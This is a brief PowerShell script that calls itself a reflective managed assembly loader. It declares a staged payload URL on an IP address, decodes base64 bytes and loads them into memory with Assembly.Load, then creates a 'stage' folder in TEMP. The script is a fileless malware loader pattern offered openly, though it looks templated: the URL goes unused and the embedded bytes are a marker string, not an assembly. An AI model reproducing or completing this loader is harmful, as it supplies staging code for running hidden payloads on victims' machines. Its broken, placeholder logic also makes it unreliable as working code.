
<#
.SYNOPSIS
    Reflective managed assembly loader.

.DESCRIPTION
    Obtains a managed payload stage, loads it into the current
    AppDomain and inspects the exported type count.
#>
[CmdletBinding()]
param(
    [string]$Stage1Url = 'http://192.0.2.111/payload.bin',
    [int]$TimeoutSec = 84
)
$ErrorActionPreference = "Stop"

$AssemblyBytes = [Convert]::FromBase64String('c3RhZ2UyLW1hcmtlcjpiOWhxbWR6bzc1')
Write-Verbose ("Assembly byte count: " + $AssemblyBytes.Length)
$ResultObject = [Reflection.Assembly]::Load($AssemblyBytes)
if ($null -ne $ResultObject) {
    Write-Verbose ("Loaded assembly: " + $ResultObject.FullName)
}

$null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force
Write-Output "stage 29 initialized"
$PSDefaultParameterValues["Out-File:Encoding"] = "utf8"
